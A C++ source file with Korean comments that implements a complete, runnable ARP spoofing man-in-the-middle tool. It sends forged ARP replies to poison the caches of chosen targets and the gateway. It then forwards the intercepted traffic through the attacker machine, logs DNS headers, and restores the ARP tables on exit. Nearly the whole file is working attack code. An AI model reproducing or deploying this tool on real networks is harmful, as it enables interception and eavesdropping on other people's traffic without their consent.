#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <thread>
#include <vector>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <memory>
#include <csignal>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

// 프로토타입 선언: get_interface_mac(), get_interface_ip()에서 사용
std::string mac_to_string(const u_int8_t* mac);
std::string ip_to_string(const u_int8_t* ip);

// UDP 헤더 구조체 (필요한 경우 <netinet/udp.h> 대신 사용)
struct udp_header {
    u_int16_t uh_sport;   // 소스 포트
    u_int16_t uh_dport;   // 목적지 포트
    u_int16_t uh_len;     // UDP 길이
    u_int16_t uh_sum;     // 체크섬
};

// DNS 헤더 구조체 (간단한 파싱을 위한 정의)
struct dns_header {
    u_int16_t id;       // 식별자
    u_int16_t flags;    // 플래그
    u_int16_t qdcount;  // 질문 레코드 수
    u_int16_t ancount;  // 응답 레코드 수
    u_int16_t nscount;  // 권한 레코드 수
    u_int16_t arcount;  // 추가 레코드 수
};

// ARP 헤더 구조체 (이더넷 헤더 다음에 오는 부분)
struct arp_header {
    u_int16_t htype;    // 하드웨어 타입
    u_int16_t ptype;    // 프로토콜 타입
    u_int8_t hlen;      // 하드웨어 주소 길이
    u_int8_t plen;      // 프로토콜 주소 길이
    u_int16_t oper;     // 작업 코드 (1=요청, 2=응답)
    u_int8_t sha[6];    // 발신자 하드웨어 주소 (MAC)
    u_int8_t spa[4];    // 발신자 프로토콜 주소 (IP)
    u_int8_t tha[6];    // 대상 하드웨어 주소 (MAC)
    u_int8_t tpa[4];    // 대상 프로토콜 주소 (IP)
};

// 인터페이스에서 MAC 주소 가져오기
bool get_interface_mac(const std::string& interface_name, u_int8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sock < 0) {
        std::cerr << "소켓 생성 실패" << std::endl;
        return false;
    }
    
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        std::cerr << "MAC 주소 가져오기 실패: " << interface_name << std::endl;
        close(sock);
        return false;
    }
    
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    
    std::cout << "인터페이스 " << interface_name << "의 MAC 주소: " << mac_to_string(mac) << std::endl;
    return true;
}

// 인터페이스에서 IP 주소 가져오기
bool get_interface_ip(const std::string& interface_name, u_int8_t* ip) {
    struct ifaddrs *ifaddr, *ifa;
    
    if (getifaddrs(&ifaddr) == -1) {
        std::cerr << "인터페이스 정보 가져오기 실패" << std::endl;
        return false;
    }
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;
        
        if (ifa->ifa_addr->sa_family == AF_INET && 
            interface_name == ifa->ifa_name) {
            struct sockaddr_in* addr = (struct sockaddr_in*)ifa->ifa_addr;
            memcpy(ip, &addr->sin_addr, 4);
            freeifaddrs(ifaddr);
            
            std::cout << "인터페이스 " << interface_name << "의 IP 주소: " << ip_to_string(ip) << std::endl;
            return true;
        }
    }
    
    freeifaddrs(ifaddr);
    std::cerr << "인터페이스 " << interface_name << "의 IPv4 주소를 찾을 수 없습니다" << std::endl;
    return false;
}

// IP 헤더 구조체
struct ip_header {
    u_int8_t  ip_vhl;   // 버전 및 헤더 길이
    u_int8_t  ip_tos;   // 서비스 타입
    u_int16_t ip_len;   // 전체 길이
    u_int16_t ip_id;    // 식별
    u_int16_t ip_off;   // 플래그 및 분할 오프셋
    u_int8_t  ip_ttl;   // 생존 시간
    u_int8_t  ip_p;     // 프로토콜
    u_int16_t ip_sum;   // 체크섬
    u_int32_t ip_src;   // 출발지 주소
    u_int32_t ip_dst;   // 목적지 주소
};

// MAC 주소를 문자열로 변환
std::string mac_to_string(const u_int8_t* mac) {
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(mac_str);
}

// IP 주소를 문자열로 변환
std::string ip_to_string(const u_int8_t* ip) {
    char ip_str[16];
    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
    return std::string(ip_str);
}

// 문자열 IP를 바이트 배열로 변환
void string_to_ip(const char* ip_str, u_int8_t* ip) {
    memset(ip, 0, 4);
    unsigned int a, b, c, d;
    if (sscanf(ip_str, "%u.%u.%u.%u", &a, &b, &c, &d) == 4) {
        ip[0] = (u_int8_t)a;
        ip[1] = (u_int8_t)b;
        ip[2] = (u_int8_t)c;
        ip[3] = (u_int8_t)d;
    } else {
        std::cerr << "잘못된 IP 주소 형식: " << ip_str << std::endl;
    }
}

// 문자열 MAC을 바이트 배열로 변환
bool string_to_mac(const char* mac_str, u_int8_t* mac) {
    return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

// MAC 주소 비교
bool mac_equals(const u_int8_t* mac1, const u_int8_t* mac2) {
    return memcmp(mac1, mac2, 6) == 0;
}

// IP 주소 비교
bool ip_equals(const u_int8_t* ip1, const u_int8_t* ip2) {
    return memcmp(ip1, ip2, 4) == 0;
}

// ARP 패킷 생성 (Ethernet 헤더 + ARP 헤더)
void create_arp_packet(u_int8_t* packet, const u_int8_t* src_mac, const u_int8_t* dst_mac,
                       const u_int8_t* src_ip, const u_int8_t* dst_ip, u_int16_t oper) {
    struct ether_header* eth = (struct ether_header*)packet;
    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ether_header));
    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(oper);
    
    memcpy(arp->sha, src_mac, 6);
    memcpy(arp->spa, src_ip, 4);
    memcpy(arp->tha, dst_mac, 6);
    memcpy(arp->tpa, dst_ip, 4);

}

// 브로드캐스트 MAC 주소와 제로 MAC 주소 상수
const u_int8_t BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
const u_int8_t ZERO_MAC[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// 전역 신호 변수
std::atomic<bool> global_running(true);

// 시그널 핸들러
void signal_handler(int signum) {
    if (signum == SIGINT) {
        std::cout << "\n프로그램 종료 중..." << std::endl;
        global_running = false;
    }
}

// ARP 스푸핑 대상 구조체
class SpoofTarget {
private:
    u_int8_t ip[4];
    u_int8_t mac[6];
    std::string ip_str;
    std::unique_ptr<std::thread> thread_ptr;
    std::atomic<bool> running;
    
public:
    SpoofTarget() : running(false) {
        memset(ip, 0, 4);
        memset(mac, 0, 6);
    }
    
    SpoofTarget(const std::string& ip_str_) : ip_str(ip_str_), running(false) {
        string_to_ip(ip_str_.c_str(), ip);
        memset(mac, 0, 6);
    }
    
    SpoofTarget(SpoofTarget&& other) noexcept 
        : ip_str(std::move(other.ip_str)), thread_ptr(std::move(other.thread_ptr)), running(other.running.load()) {
        memcpy(ip, other.ip, 4);
        memcpy(mac, other.mac, 6);
        other.running = false;
    }
    
    SpoofTarget& operator=(SpoofTarget&& other) noexcept {
        if (this != &other) {
            stop_thread();
            ip_str = std::move(other.ip_str);
            thread_ptr = std::move(other.thread_ptr);
            running = other.running.load();
            memcpy(ip, other.ip, 4);
            memcpy(mac, other.mac, 6);
            other.running = false;
        }
        return *this;
    }
    
    ~SpoofTarget() {
        stop_thread();
    }
    
    void stop_thread() {
        if (running && thread_ptr && thread_ptr->joinable()) {
            running = false;
            thread_ptr->join();
        }
    }
    
    template<typename Func, typename... Args>
    void start_thread(Func&& func, Args&&... args) {
        stop_thread();
        running = true;
        thread_ptr = std::make_unique<std::thread>(std::forward<Func>(func), std::forward<Args>(args)...);
    }
    
    const u_int8_t* get_ip() const { return ip; }
    const u_int8_t* get_mac() const { return mac; }
    const std::string& get_ip_str() const { return ip_str; }
    bool is_running() const { return running; }
    void set_mac(const u_int8_t* mac_) { memcpy(mac, mac_, 6); }
    void set_running(bool val) { running = val; }
    
    SpoofTarget(const SpoofTarget&) = delete;
    SpoofTarget& operator=(const SpoofTarget&) = delete;
};

class ArpSpoofer {
private:
    pcap_t* handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    std::string interface;
    u_int8_t attacker_mac[6];
    u_int8_t attacker_ip[4];
    u_int8_t gateway_mac[6];
    u_int8_t gateway_ip[4];
    std::string gateway_ip_str;
    
    std::vector<std::unique_ptr<SpoofTarget>> targets;
    std::atomic<bool> forwarding_running;
    std::unique_ptr<std::thread> forwarding_thread;
    
    std::mutex mutex;
    std::condition_variable cv;
    
public:
    ArpSpoofer(const std::string& iface) : interface(iface), handle(nullptr), forwarding_running(false) {
        memset(errbuf, 0, PCAP_ERRBUF_SIZE);
        memset(attacker_mac, 0, 6);
        memset(attacker_ip, 0, 4);
        memset(gateway_mac, 0, 6);
        memset(gateway_ip, 0, 4);
    }
    
    ~ArpSpoofer() {
        stop_all();
        if (handle) {
            pcap_close(handle);
        }
    }
    
    bool initialize() {
        handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            std::cerr << "인터페이스를 열 수 없습니다: " << errbuf << std::endl;
            return false;
        }
        
        struct bpf_program fp;
        char filter_exp[] = "arp or ip";
        
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            std::cerr << "필터를 컴파일할 수 없습니다: " << pcap_geterr(handle) << std::endl;
            std::cout << "경고: 필터가 설정되지 않았습니다. 모든 패킷이 캡처됩니다." << std::endl;
        } else {
            if (pcap_setfilter(handle, &fp) == -1) {
                std::cerr << "필터를 설정할 수 없습니다: " << pcap_geterr(handle) << std::endl;
                std::cout << "경고: 필터가 설정되지 않았습니다. 모든 패킷이 캡처됩니다." << std::endl;
            } else {
                std::cout << "패킷 필터 설정 성공 (ARP 또는 IP 패킷만 캡처)" << std::endl;
            }
        }
        
        if (!get_interface_mac(interface, attacker_mac)) {
            std::cerr << "인터페이스 MAC 주소를 가져올 수 없습니다: " << interface << std::endl;
            return false;
        }
        
        if (!get_interface_ip(interface, attacker_ip)) {
            std::cerr << "인터페이스 IP 주소를 가져올 수 없습니다: " << interface << std::endl;
            return false;
        }
        
        std::cout << "인터페이스 " << interface << " 를 성공적으로 열었습니다" << std::endl;
        return true;
    }
    
    bool set_gateway(const std::string& gateway_ip_str_) {
        gateway_ip_str = gateway_ip_str_;
        string_to_ip(gateway_ip_str.c_str(), gateway_ip);
        
        std::cout << "설정된 주소들:" << std::endl;
        std::cout << "공격자 MAC: " << mac_to_string(attacker_mac) << std::endl;
        std::cout << "공격자 IP: " << ip_to_string(attacker_ip) << std::endl;
        std::cout << "게이트웨이 IP: " << ip_to_string(gateway_ip) << std::endl;
        
        if (!get_mac_from_ip(gateway_ip, gateway_mac)) {
            std::cerr << "게이트웨이 MAC 주소를 찾을 수 없습니다" << std::endl;
            return false;
        }
        
        std::cout << "게이트웨이 MAC: " << mac_to_string(gateway_mac) << std::endl;
        return true;
    }
    
    bool add_target(const std::string& target_ip_str) {
        auto target = std::make_unique<SpoofTarget>(target_ip_str);
        
        u_int8_t target_mac[6];
        if (!get_mac_from_ip(target->get_ip(), target_mac)) {
            std::cerr << "대상 MAC 주소를 찾을 수 없습니다: " << target_ip_str << std::endl;
            return false;
        }
        
        target->set_mac(target_mac);
        
        std::cout << "새로운 스푸핑 대상 추가: " << std::endl;
        std::cout << "IP: " << target_ip_str << std::endl;
        std::cout << "MAC: " << mac_to_string(target_mac) << std::endl;
        
        std::lock_guard<std::mutex> lock(mutex);
        targets.push_back(std::move(target));
        
        return true;
    }
    
    // ARP 요청만 사용하여 타겟 MAC 검색 (불필요한 디버그 로그 제거)
    bool get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) {
        std::cout << "찾는 IP 주소: " << ip_to_string(target_ip) << std::endl;
        
        u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
        const int MAX_ATTEMPTS = 3;
        for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
            create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);

            if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
                std::cerr << "패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
                continue;
            }
            
            struct pcap_pkthdr header;
            const u_char* packet_data;
            time_t start_time = time(NULL);
            
            while (time(NULL) - start_time < 10) {
                packet_data = pcap_next(handle, &header);
                if (packet_data == NULL)
                    continue;
                
                struct ether_header* eth = (struct ether_header*)packet_data;
                if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
                    continue;
                
                struct arp_header* arp = (struct arp_header*)(packet_data + sizeof(struct ether_header));
                // 타겟 IP와 일치하는 ARP 패킷만 확인합니다.
                if (memcmp(arp->spa, target_ip, 4) == 0) {
                    memcpy(target_mac, arp->sha, 6);
                    std::cout << "MAC 주소 찾음: " << mac_to_string(target_mac) << std::endl;
                    return true;
                }
            }
        }
        return false;
    }
    
    void send_arp_spoofing_packet(const SpoofTarget* target) {
        u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
        
        std::cout << "게이트웨이 IP를 위한 스푸핑 패킷: " << ip_to_string(gateway_ip) << std::endl;
        create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
        
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "대상에게 스푸핑 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cout << "대상 " << target->get_ip_str() << "에게 스푸핑 패킷 전송 성공" << std::endl;
        }
        
        std::cout << "대상 IP를 위한 스푸핑 패킷: " << target->get_ip_str() << std::endl;
        create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
        
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "게이트웨이에게 스푸핑 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cout << "게이트웨이에게 스푸핑 패킷 전송 성공 (대상 IP: " << target->get_ip_str() << ")" << std::endl;
        }
    }
    
    void spoof_target_thread(SpoofTarget* target) {
        std::cout << "대상 " << target->get_ip_str() << "에 대한 스푸핑 시작" << std::endl;
        while (target->is_running() && global_running) {
            send_arp_spoofing_packet(target);
            sleep(1);   // 1ms 대기 (safty)
        }
        std::cout << "대상 " << target->get_ip_str() << "에 대한 스푸핑 종료" << std::endl;
    }
    
    void start_spoofing_all() {
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            if (!target->is_running()) {
                target->start_thread(&ArpSpoofer::spoof_target_thread, this, target.get());
            }
        }
    }
    
    // 복구용 ARP 패킷 전송 (원래의 MAC 주소 복원)
    void send_recover_arp_packets() {
        std::cout << "원래 ARP 테이블 복구 중..." << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            u_int8_t packet1[sizeof(struct ether_header) + sizeof(struct arp_header)];
            create_arp_packet(packet1, target->get_mac(), gateway_mac, target->get_ip(), gateway_ip, 2);
            
            if (pcap_sendpacket(handle, packet1, sizeof(packet1)) != 0) {
                std::cerr << "게이트웨이에 복구 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "게이트웨이에 복구 패킷 전송 성공: " 
                          << target->get_ip_str() << " -> " << ip_to_string(gateway_ip) << std::endl;
            }
            
            u_int8_t packet2[sizeof(struct ether_header) + sizeof(struct arp_header)];
            create_arp_packet(packet2, gateway_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
            
            if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0) {
                std::cerr << "대상에 복구 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "대상에 복구 패킷 전송 성공: " 
                          << ip_to_string(gateway_ip) << " -> " << target->get_ip_str() << std::endl;
            }
            
            for (int i = 0; i < 3; i++) {
                pcap_sendpacket(handle, packet1, sizeof(packet1));
                pcap_sendpacket(handle, packet2, sizeof(packet2));
                usleep(100000);
            }
        }
    }
    
    void stop_all() {
        std::cout << "\n프로그램 종료 중..." << std::endl;
        send_recover_arp_packets();
        if (forwarding_running) {
            forwarding_running = false;
            cv.notify_all();
            if (forwarding_thread && forwarding_thread->joinable()) {
                forwarding_thread->join();
            }
        }
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            target->stop_thread();
        }
        std::cout << "모든 스레드 종료 완료" << std::endl;
    }
    
    bool is_spoofed_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(struct ether_header))
            return false;
        
        struct ether_header* eth = (struct ether_header*)packet_data;
        if (ntohs(eth->ether_type) != ETHERTYPE_IP)
            return false;
        
        if (packet_len < sizeof(struct ether_header) + sizeof(struct ip_header))
            return false;
        
        struct ip_header* ip = (struct ip_header*)(packet_data + sizeof(struct ether_header));
        u_int8_t src_ip[4], dst_ip[4];
        memcpy(src_ip, &ip->ip_src, 4);
        memcpy(dst_ip, &ip->ip_dst, 4);
        
        bool src_is_target = false;
        bool dst_is_target = false;
        bool src_is_gateway = ip_equals(src_ip, gateway_ip);
        bool dst_is_gateway = ip_equals(dst_ip, gateway_ip);
        
        {
            std::lock_guard<std::mutex> lock(mutex);
            for (const auto& target : targets) {
                if (ip_equals(src_ip, target->get_ip()))
                    src_is_target = true;
                if (ip_equals(dst_ip, target->get_ip()))
                    dst_is_target = true;
            }
        }
        
        return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
    }
    
    void forward_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(struct ether_header) + sizeof(struct ip_header))
            return;
        
        u_int8_t* new_packet = new u_int8_t[packet_len];
        memcpy(new_packet, packet_data, packet_len);
        
        struct ether_header* eth = (struct ether_header*)new_packet;
        struct ip_header* ip = (struct ip_header*)(new_packet + sizeof(struct ether_header));
        u_int8_t src_ip[4], dst_ip[4];
        memcpy(src_ip, &ip->ip_src, 4);
        memcpy(dst_ip, &ip->ip_dst, 4);
        
        bool src_is_gateway = ip_equals(src_ip, gateway_ip);
        
        if (src_is_gateway) {
            memcpy(eth->ether_shost, attacker_mac, 6);
            bool found = false;
            {
                std::lock_guard<std::mutex> lock(mutex);
                for (const auto& target : targets) {
                    if (ip_equals(dst_ip, target->get_ip())) {
                        memcpy(eth->ether_dhost, target->get_mac(), 6);
                        found = true;
                        break;
                    }
                }
            }
            if (!found) {
                delete[] new_packet;
                return;
            }
        } else {
            memcpy(eth->ether_shost, attacker_mac, 6);
            memcpy(eth->ether_dhost, gateway_mac, 6);
        }
        
        // DNS 패킷 검사: IP 프로토콜이 UDP인지, UDP 헤더의 소스 혹은 목적지 포트가 53인지 확인
        if (ip->ip_p == IPPROTO_UDP) {
            int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
            if (packet_len >= sizeof(struct ether_header) + ip_header_len + sizeof(struct udp_header)) {
                struct udp_header* udp = (struct udp_header*)(new_packet + sizeof(struct ether_header) + ip_header_len);
                u_int16_t sport = ntohs(udp->uh_sport);
                u_int16_t dport = ntohs(udp->uh_dport);
                if (sport == 53 || dport == 53) {
                    // 충분한 길이인지 확인한 후 DNS 헤더 파싱
                    if (packet_len >= sizeof(struct ether_header) + ip_header_len + sizeof(struct udp_header) + sizeof(struct dns_header)) {
                        struct dns_header* dns = (struct dns_header*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(struct udp_header));
                        std::cout << "DNS 패킷 감지: "
                                  << "ID=" << ntohs(dns->id)
                                  << " Flags=0x" << std::hex << ntohs(dns->flags) << std::dec
                                  << " QDCount=" << ntohs(dns->qdcount)
                                  << " ANCount=" << ntohs(dns->ancount)
                                  << " NSCount=" << ntohs(dns->nscount)
                                  << " ARCount=" << ntohs(dns->arcount)
                                  << std::endl;
                    }
                }
            }
        }
        
        // 패킷 포워딩
        if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
            std::cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << std::endl;
        
        delete[] new_packet;
    }
    

    void start_packet_forwarding() {
        if (forwarding_running) {
            std::cout << "패킷 포워딩이 이미 실행 중입니다" << std::endl;
            return;
        }
        
        forwarding_running = true;
        forwarding_thread = std::make_unique<std::thread>([this]() {
            std::cout << "패킷 포워딩 시작" << std::endl;
            struct pcap_pkthdr* header;
            const u_int8_t* packet_data;
            int res;
            while (forwarding_running && global_running) {
                res = pcap_next_ex(handle, &header, &packet_data);
                if (res == 0)
                    continue;
                else if (res < 0) {
                    std::cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << std::endl;
                    break;
                }
                if (is_spoofed_packet(packet_data, header->len))
                    forward_packet(packet_data, header->len);
            }
            std::cout << "패킷 포워딩 종료" << std::endl;
        });
    }
    
    static bool enable_ip_forwarding() {
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        std::cout << "시스템 IP 포워딩 활성화" << std::endl;
        return true;
    }
    
    static bool disable_ip_forwarding() {
        system("echo 0 > /proc/sys/net/ipv4/ip_forward");
        std::cout << "시스템 IP 포워딩 비활성화" << std::endl;
        return true;
    }
};

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "사용법: " << argv[0] << " <인터페이스> <게이트웨이IP> <대상IP1> [<대상IP2> ...]" << std::endl;
        std::cerr << "예시: " << argv[0] << " eth0 192.168.1.1 192.168.1.100 192.168.1.101" << std::endl;
        return 1;
    }
    
    std::string interface = argv[1];
    std::string gateway_ip = argv[2];
    
    ArpSpoofer::enable_ip_forwarding();
    std::signal(SIGINT, signal_handler);
    
    ArpSpoofer* spoofer = new ArpSpoofer(interface);
    
    std::atexit([]() {
        ArpSpoofer::disable_ip_forwarding();
    });
    
    if (!spoofer->initialize()) {
        delete spoofer;
        return 1;
    }
    
    if (!spoofer->set_gateway(gateway_ip)) {
        delete spoofer;
        return 1;
    }
    
    for (int i = 3; i < argc; i++) {
        std::string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
            std::cerr << "대상 " << target_ip << " 추가 실패" << std::endl;
    }
    
    spoofer->start_packet_forwarding();
    spoofer->start_spoofing_all();
    
    std::cout << "실행 중... (Ctrl+C로 종료)" << std::endl;
    std::cout << "ARP 스푸핑이 활성화되었습니다. 종료하면 자동으로 원래 ARP 테이블이 복구됩니다." << std::endl;
    
    while (global_running)
        sleep(1);
    
    spoofer->stop_all();
    delete spoofer;
    ArpSpoofer::disable_ip_forwarding();
    
    std::cout << "프로그램이 정상적으로 종료되었습니다." << std::endl;
    return 0;
}
